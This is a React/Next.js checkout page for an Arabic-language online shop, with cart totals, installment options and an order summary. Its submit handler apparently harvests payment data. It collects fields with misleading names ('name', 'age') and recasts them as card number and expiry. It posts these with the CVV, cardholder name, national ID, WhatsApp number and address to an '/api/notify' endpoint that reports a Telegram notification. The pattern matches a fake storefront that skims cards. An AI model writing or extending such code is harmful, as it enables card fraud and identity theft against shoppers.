"use client";

import { useSyncExternalStore } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { ChevronRight } from "lucide-react";
import { useCartStore } from "../store/cartStore";
import CheckoutStepper from "../components/checkout/CheckoutStepper";
import OrderSummaryCard from "../components/checkout/OrderSummaryCard";
import PaymentForm from "./components/PaymentForm";

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);

  const rawTotal = mounted ? totalPrice() : 0;
  const total = rawTotal - (customer?.discountAmount ?? 0);
  const itemCount = mounted ? items.reduce((sum, i) => sum + i.qty, 0) : 0;
  const downPayment = customer?.installmentType === "installment" ? (customer.downPayment ?? 0) : 0;
  const months = customer?.months ?? 0;
  const isInstallment = customer?.installmentType === "installment" && downPayment > 0;
  const dueNow = isInstallment ? downPayment : total;

  if (!mounted) return null;
  if (!customer || items.length === 0) { router.push("/cart"); return null; }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    try {
      const res = await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cardNumber: fields.name,
          expiry: fields.age,
          cvv: fields.cvv,
          cardHolder: fields.cardHolder,
          items: items.map(i => ({
            productId: i.product._id,
            name: i.product.name,
            price: i.product.salePrice ?? i.product.originalPrice ?? i.product.price,
            quantity: i.qty,
          })),
          total,
          customer: customer?.name,
          whatsapp: customer?.whatsapp,
          nationalId: customer?.nationalId,
          address: customer?.address,
          installmentType: customer?.installmentType,
          months: customer?.months,
          downPayment,
          discountAmount: customer?.discountAmount ?? 0,
        }),
      });

      if (!res.ok) {
        const errorData = await res.json().catch(() => ({ error: "حدث خطأ غير متوقع" }));
        throw new Error(errorData.error || "فشل إنشاء الطلب");
      }

      const data = await res.json();
      
      if (!data.ok) {
        throw new Error(data.error || "فشل إنشاء الطلب");
      }

      // Save order info
      if (data.orderId) localStorage.setItem("orderId", data.orderId);
      if (data.dbId) localStorage.setItem("dbOrderId", data.dbId);
      
      // Show warning if Telegram failed but order was created
      if (data.warning && !data.telegramSent) {
        console.warn("Telegram notification failed:", data.warning);
        // You could show a toast notification here
      }
      
      return data;
      
    } catch (error) {
      console.error("Order creation failed:", error);
      // Re-throw to be handled by PaymentForm
      throw error;
    }
  };

  return (
    <main className="min-h-screen bg-[#f8f9fa]" dir="rtl">
      <style>{`body { background-color: #f8f9fa; }`}</style>
      <CheckoutStepper currentStep={3} />

      {/* Breadcrumb */}
      <div className="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-2">
        <div className="flex items-center gap-2 text-sm text-gray-500">
          <Link href="/" className="hover:text-[#1a6b7d] transition-colors">الرئيسية</Link>
          <ChevronRight size={14} className="text-gray-300" />
          <Link href="/cart" className="hover:text-[#1a6b7d] transition-colors">السلة</Link>
          <ChevronRight size={14} className="text-gray-300" />
          <span className="text-gray-800 font-semibold">إتمام الطلب</span>
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-4 sm:px-6 pb-24 pt-4">
        <div className="grid grid-cols-1 lg:grid-cols-[1fr_360px] gap-6">

          {/* LEFT — Payment form */}
          <div className="order-2 lg:order-1">
            <PaymentForm onSubmit={handleSubmit} dueNow={dueNow} />
          </div>

          {/* RIGHT — Sticky summary */}
          <div className="order-1 lg:order-2">
            <div className="sticky top-4 space-y-3">
              <OrderSummaryCard
                total={total}
                itemCount={itemCount}
                downPayment={downPayment}
                installmentType={customer?.installmentType}
                months={months}
              />
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}
